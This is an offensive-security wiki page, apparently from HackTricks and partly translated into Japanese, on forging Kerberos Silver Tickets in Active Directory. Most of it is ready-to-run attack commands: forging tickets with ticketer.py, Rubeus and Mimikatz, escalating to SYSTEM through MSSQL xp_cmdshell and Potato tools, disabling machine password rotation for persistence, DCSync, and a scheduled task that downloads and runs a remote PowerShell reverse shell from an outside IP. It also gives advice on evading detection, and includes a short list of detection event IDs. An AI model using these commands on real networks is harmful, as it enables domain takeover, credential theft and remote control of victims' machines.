# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### Linux上
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows上で
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFSサービスは被害者のファイルシステムにアクセスする一般的なターゲットとして強調されますが、HOSTやRPCSSのような他のサービスもタスクやWMIクエリで悪用できます。

### 例: MSSQLサービス (MSSQLSvc) + Potato による SYSTEM への昇格

SQL service account（例: sqlsvc）のNTLM hash（またはAES key）を持っている場合、MSSQL SPNのTGSをforgeしてSQLサービスに対して任意のユーザーをimpersonateできます。そこからxp_cmdshellを有効にしてSQLサービスアカウントとしてコマンドを実行します。そのトークンがSeImpersonatePrivilegeを持っていれば、PotatoをチェーンしてSYSTEMに昇格できます。
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 結果のコンテキストが SeImpersonatePrivilege を持っている場合（サービスアカウントではしばしば当てはまる）、SYSTEM を取得するために Potato バリアントを使用してください：
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
More details on abusing MSSQL and enabling xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 利用可能なサービス

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: アカウントのログオン
- 4634: アカウントのログオフ
- 4672: 管理者ログオン
- **同じクライアント/サービスに対してDC上に先行する 4768/4769 が存在しない**ことは、偽造されたTGSがサービスに直接提示されている一般的な指標です。
- チケットの有効期間が異常に長い、または予期しない暗号化タイプ（ドメインがAESを強制しているのにRC4が使われている等）も、4769/4624 のデータで目立ちます。

## 永続化

マシンが30日ごとにパスワードをローテートするのを避けるには、`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` に設定するか、`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` を30日より大きい値に設定して、マシンのパスワードをローテーションする期間を長くすることができます。

## サービスチケットの悪用

以下の例では、チケットがadministratorアカウントを模倣して取得されたと仮定します。

### CIFS

このチケットがあれば、`C$` と `ADMIN$` フォルダに **SMB** 経由でアクセスでき（公開されていれば）、リモートファイルシステムの一部にファイルをコピーできます。例えば次のように:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
また、**psexec** を使って host 内で shell を取得したり、任意のコマンドを実行したりできます:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

この権限があれば、リモートコンピュータで scheduled tasks を生成して任意のコマンドを実行できます:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

これらの tickets を使うと、**被害者のシステムで WMI を実行できます**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
以下のページで **wmiexec** に関する詳細情報を確認してください:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

コンピュータに対して winrm アクセスがあると、**アクセス**して PowerShell を取得することさえできます:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
次のページを参照して、**winrm を使用してリモートホストに接続するための他の方法**を学んでください：

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> リモートコンピュータにアクセスするには、**winrm が有効でリッスンしている**必要があることに注意してください。

### LDAP

この権限があれば、**DCSync** を使用して DC のデータベースをダンプできます:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
以下のページで**DCSync**について詳しく学んでください:


{{#ref}}
dcsync.md
{{#endref}}


## 参考文献

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
